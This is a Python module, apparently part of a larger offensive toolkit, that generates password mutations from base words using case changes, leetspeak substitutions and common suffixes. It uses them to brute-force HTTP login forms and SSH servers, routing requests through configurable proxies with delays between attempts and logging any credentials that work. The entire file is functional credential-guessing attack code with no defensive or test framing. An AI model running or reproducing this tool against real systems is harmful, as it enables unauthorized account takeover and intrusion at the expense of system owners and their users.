# src/modules/brute_forcer.py

import requests
import time
try:
    import paramiko
except ImportError:
    paramiko = None

from logger import logger
from config import DELAY, PROXIES

# Leetspeak mapping and common suffixes
LEET_MAP = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '$',
            'A': '4', 'E': '3', 'I': '1', 'O': '0', 'S': '$'}
COMMON_SUFFIXES = ["123", "@123", "2023", "!"]

def leetspeak_variations(word):
    """Generate all leetspeak variations of the given word."""
    results = set()
    def helper(prefix, rest):
        if not rest:
            results.add(prefix)
            return
        first = rest[0]
        # Option 1: keep original character
        helper(prefix + first, rest[1:])
        # Option 2: replace with leetspeak if applicable
        if first in LEET_MAP:
            helper(prefix + LEET_MAP[first], rest[1:])
    helper("", word)
    return results

def case_variations(word):
    """Generate simple case permutations of the given word."""
    return {word.lower(), word.upper(), word.capitalize()}

def generate_mutations(word):
    """
    Generate a set of password mutations from the base word, including:
    - Case variations (lower, upper, capitalized)
    - Leetspeak substitutions
    - Common suffix additions
    """
    mutations = set()
    base_variants = case_variations(word) | {word}
    for base in base_variants:
        for leet_variant in leetspeak_variations(base):
            mutations.add(leet_variant)
            for suffix in COMMON_SUFFIXES:
                mutations.add(f"{leet_variant}{suffix}")
    return list(mutations)

def http_brute_force(url, usernames, base_passwords):
    """
    Perform HTTP brute-force using mutated passwords for each username.
    Example assumes a form with 'username' and 'password' fields.
    """
    for user in usernames:
        for base in base_passwords:
            mutated_passwords = generate_mutations(base)
            for pwd in mutated_passwords:
                try:
                    response = requests.post(
                        url,
                        data={'username': user, 'password': pwd},
                        proxies=PROXIES
                    )
                    if response.status_code == 200:
                        logger.info(f"HTTP login successful: {user}:{pwd}")
                        return True
                except Exception as e:
                    logger.error(f"HTTP request failed for {user}@{url} with {pwd}: {e}")
                time.sleep(DELAY)
    logger.info("HTTP brute force completed (no successful login found).")
    return False

def ssh_brute_force(host, usernames, base_passwords):
    """
    Perform SSH brute-force using mutated passwords for each username.
    Requires the 'paramiko' library.
    """
    if paramiko is None:
        logger.error("Paramiko not installed; cannot perform SSH brute force.")
        return False
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in usernames:
        for base in base_passwords:
            mutated_passwords = generate_mutations(base)
            for pwd in mutated_passwords:
                try:
                    ssh.connect(hostname=host, username=user, password=pwd, timeout=3)
                    logger.info(f"SSH login successful for {user}@{host} with password: {pwd}")
                    ssh.close()
                    return True
                except paramiko.AuthenticationException:
                    logger.debug(f"SSH auth failed for {user}@{host} with {pwd}")
                except Exception as e:
                    logger.error(f"SSH error for {user}@{host} with {pwd}: {e}")
                time.sleep(DELAY)
    logger.info("SSH brute force completed (no successful login found).")
    return False